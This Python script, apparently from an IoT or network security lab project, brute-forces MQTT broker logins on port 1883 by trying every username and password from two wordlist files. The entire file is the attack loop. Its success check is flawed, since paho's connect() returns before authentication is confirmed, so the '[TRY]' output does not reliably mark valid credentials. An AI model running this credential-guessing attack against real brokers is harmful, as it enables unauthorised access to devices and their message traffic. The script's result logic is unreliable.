import time
import json
import os
import sys
from paho.mqtt.client import Client

# -------------------------------------------------------------------
# Resolve paths relative to script location
# -------------------------------------------------------------------
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))  # /attacks
BASE_DIR = os.path.dirname(SCRIPT_DIR)                   # project root
CONFIG_PATH = os.path.join(BASE_DIR, "configs", "network_config.json")

USERS_PATH = os.path.join(BASE_DIR, "users.txt")
PASSWORDS_PATH = os.path.join(BASE_DIR, "passwords.txt")

# -------------------------------------------------------------------
# Determine broker IP source
# -------------------------------------------------------------------
if len(sys.argv) >= 2:
    BROKER = sys.argv[1]
    print(f"[INFO] Using broker IP from CLI: {BROKER}")
else:
    print(f"[INFO] No broker IP passed via CLI — loading from config...")

    try:
        with open(CONFIG_PATH, "r") as f:
            cfg = json.load(f)
            BROKER = cfg.get("broker_ip", "127.0.0.1")
        print(f"[INFO] Loaded broker IP from config: {BROKER}")
    except Exception as e:
        print(f"[ERROR] Could not load config file: {e}")
        print("[INFO] Falling back to default broker 127.0.0.1")
        BROKER = "127.0.0.1"

PORT = 1883

# -------------------------------------------------------------------
# Load usernames + passwords
# -------------------------------------------------------------------
with open(USERS_PATH) as f:
    usernames = [u.strip() for u in f if u.strip()]

with open(PASSWORDS_PATH) as f:
    passwords = [p.strip() for p in f if p.strip()]

print(f"[INFO] Loaded {len(usernames)} usernames and {len(passwords)} passwords")

# -------------------------------------------------------------------
# Bruteforce loop
# -------------------------------------------------------------------
for u in usernames:
    for p in passwords:
        try:
            client = Client()
            client.username_pw_set(u, p)
            client.connect(BROKER, PORT, keepalive=60)
            client.disconnect()
            print(f"[TRY]  {u}:{p}")
        except Exception:
            print(f"[FAIL] {u}:{p}")
        time.sleep(0.05)
